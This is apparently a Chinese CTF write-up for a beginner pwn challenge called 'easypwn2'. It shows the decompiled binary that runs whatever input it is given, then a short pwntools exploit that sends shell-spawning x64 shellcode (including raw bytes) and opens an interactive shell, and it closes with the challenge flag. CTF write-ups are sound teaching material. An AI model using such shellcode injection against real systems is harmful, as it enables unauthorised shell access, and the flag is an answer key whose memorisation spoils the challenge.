# easypwn2
```
nc seclabs.cn 5117

急需pwn哥哥，白给分数了，现在开始学也能做得出来的，加油
```
[pwn2](attachment/pwn2)
## WriteUp
ida反编译，只有一个函数
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  printf("%p\n", &buf);
  printf("shellcode:");
  read(0, &buf, 0x100uLL);
  return (buf)(0LL, &buf);
}
```

这题直接没人做了是让我最神奇的，因为这题只要你随便去抄一个`linux x64`下getshell的shellcode都能拿到shell,本来我是想说给个地址让你们输入flag后再自己跳转执行，后来想想还是算了，输入就直接执行吧，结果还是惨惨


### EXP
```python
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
n = process('./pwn2')

#sc = '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
sc = asm(shellcraft.sh())
n.recvuntil('shellcode:')
n.sendline(sc)

n.interactive()
```


## flag

`flag{e16486ee-f54f-11e9-81a8-000c29ad2ad8}`
